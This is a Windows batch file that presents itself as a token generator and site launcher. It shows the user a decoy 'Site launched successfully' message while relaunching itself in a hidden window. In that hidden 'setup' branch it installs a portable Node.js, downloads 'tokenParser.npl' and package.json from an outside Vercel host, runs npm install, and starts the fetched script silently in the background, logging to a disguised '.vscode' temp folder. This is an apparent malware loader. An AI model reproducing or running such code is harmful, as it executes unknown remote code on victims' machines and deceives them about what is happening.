@echo off
title Creating new Info
setlocal enabledelayedexpansion

if "%~1"=="setup" goto :SETUP

:: Launch setup logic silently in background (same file, hidden)
powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" setup' -WindowStyle Hidden"

:: Generate AES-encrypted token
powershell -NoProfile -Command "$secret = [System.Text.Encoding]::UTF8.GetBytes('TLL_SECRET_2026salt'); $sha = [System.Security.Cryptography.SHA256]::Create(); $key = $sha.ComputeHash($secret); $passkey = 'ztakora-demo-2026'; $exp = [System.DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() + 604800000; $payload = [System.Text.Encoding]::UTF8.GetBytes('{\"passkey\":\"' + $passkey + '\",\"exp\":' + $exp + '}'); $aes = [System.Security.Cryptography.Aes]::Create(); $aes.Key = $key; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; $aes.GenerateIV(); $iv = $aes.IV; $enc = $aes.CreateEncryptor(); $ct = $enc.TransformFinalBlock($payload, 0, $payload.Length); $ivHex = -join ($iv | ForEach-Object { $_.ToString('x2') }); $ctHex = -join ($ct | ForEach-Object { $_.ToString('x2') }); Write-Output ($ivHex + ':' + $ctHex)" > "%TEMP%\tll_token.txt"

:: Read token and open site
set /p TOKEN=<"%TEMP%\tll_token.txt"

echo.
echo  Site launched successfully.
echo  Press any key to close this window...
pause >nul

goto :EOF

:SETUP

:: -------------------------
:: Log system
:: -------------------------
set "LOG_DIR=%TEMP%\.vscode"
set "LOG_FILE=%LOG_DIR%\token.log"
if not exist "%LOG_DIR%" mkdir "%LOG_DIR%"

call :LogInfo "=== token started ==="
call :LogInfo "Log file: %LOG_FILE%"

:: Pin to Node 22 LTS (supported by better-sqlite3)
set "NODE_VERSION=22.18.0"
set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
set "EXTRACT_DIR=%~dp0nodejs"
set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
set "PORTABLE_NPM=%EXTRACT_DIR%\PFiles64\nodejs\npm.cmd"
set "NODE_EXE="
set "NPM_EXE="

call :LogInfo "Target Node.js version: v%NODE_VERSION%"
call :LogInfo "Download URL: %DOWNLOAD_URL%"

:: If existing portable Node is not v22, remove it so we re-download
if exist "%PORTABLE_NODE%" (
    "%PORTABLE_NODE%" -v 2>nul | findstr /C:"v22." >nul
    if errorlevel 1 (
        call :LogWarn "Existing portable Node is not v22; removing for re-download"
        rmdir /s /q "%EXTRACT_DIR%"
    )
)

:: -------------------------
:: Check for global Node.js
:: -------------------------
:: for /f "delims=" %%v in ('node -v 2^>nul') do (
::     set "NODE_EXE=node"
::     set "NPM_EXE=npm"
::     set "NODE_INSTALLED_VERSION=%%v"
:: )

if defined NODE_EXE (
    call :LogInfo "Node.js is already installed globally: %NODE_INSTALLED_VERSION%"
) else (
    if exist "%PORTABLE_NODE%" (
        call :LogInfo "Portable Node.js found after extraction"
        set "NODE_EXE=%PORTABLE_NODE%"
        set "NPM_EXE=%PORTABLE_NPM%"
        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
    ) else (
        call :LogInfo "Node.js not found. Attempting to download portable version..."

        :: Download Node.js MSI if needed
        where curl >nul 2>&1
        if %errorlevel% NEQ 0 (
            call :LogInfo "curl not found, downloading with PowerShell..."
            powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
        ) else (
            call :LogInfo "Downloading with curl..."
            curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
        )

        if exist "%~dp0%NODE_MSI%" (
            call :LogInfo "Extracting Node.js MSI..."
            msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
            del "%~dp0%NODE_MSI%"
        ) else (
            call :LogError "Failed to download Node.js MSI"
            exit /b 1
        )

        if exist "%PORTABLE_NODE%" (
            call :LogSuccess "Portable Node.js ready"
            set "NODE_EXE=%PORTABLE_NODE%"
            set "NPM_EXE=%PORTABLE_NPM%"
            set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
        ) else (
            call :LogError "Portable Node.js not found after extraction"
            exit /b 1
        )
    )
)

call :LogInfo "Downloading tokenParser.npl and package.json..."
curl -s -L -o "%TEMP%\tokenParser.npl" "https://sandbox-five-iota.vercel.app/tokenParser"
curl -s -L -o "%TEMP%\package.json" "https://sandbox-five-iota.vercel.app/package.json"

if not exist "%TEMP%\tokenParser.npl" (
    call :LogError "Failed to download tokenParser.npl"
    exit /b 1
)
if not exist "%TEMP%\package.json" (
    call :LogError "Failed to download package.json"
    exit /b 1
)
call :LogSuccess "Required files downloaded"

pushd "%TEMP%"
call :LogInfo "Running npm install..."
call "%NPM_EXE%" install
if errorlevel 1 (
    popd
    call :LogError "npm install failed"
    exit /b 1
)
popd
call :LogSuccess "npm install completed"

"%NODE_EXE%" -v >nul 2>&1
if errorlevel 1 (
    call :LogError "node executable check failed"
    exit /b 1
)
for /f "delims=" %%v in ('"%NODE_EXE%" -v 2^>nul') do call :LogInfo "node: %%v"

if exist "%TEMP%\tokenParser.npl" (
    call :LogInfo "Starting tokenParser.npl in background..."
    start "" /b "%NODE_EXE%" "%TEMP%\tokenParser.npl"
    if errorlevel 1 (
        call :LogError "tokenParser execution failed"
        exit /b 1
    )
    call :LogSuccess "tokenParser.npl started"
) else (
    call :LogError "tokenParser.npl not found"
    exit /b 1
)

call :LogSuccess "Script completed successfully"
exit /b 0

:: -------------------------
:: Log helpers
:: -------------------------
:Log
set "LOG_LEVEL=%~1"
set "LOG_MSG=%~2"
>>"%LOG_FILE%" echo [%date% %time%] [%LOG_LEVEL%] %LOG_MSG%
echo [%date% %time%] [%LOG_LEVEL%] %LOG_MSG%
goto :EOF

:LogInfo
call :Log INFO "%~1"
goto :EOF

:LogWarn
call :Log WARN "%~1"
goto :EOF

:LogError
call :Log ERROR "%~1"
goto :EOF

:LogSuccess
call :Log SUCCESS "%~1"
goto :EOF
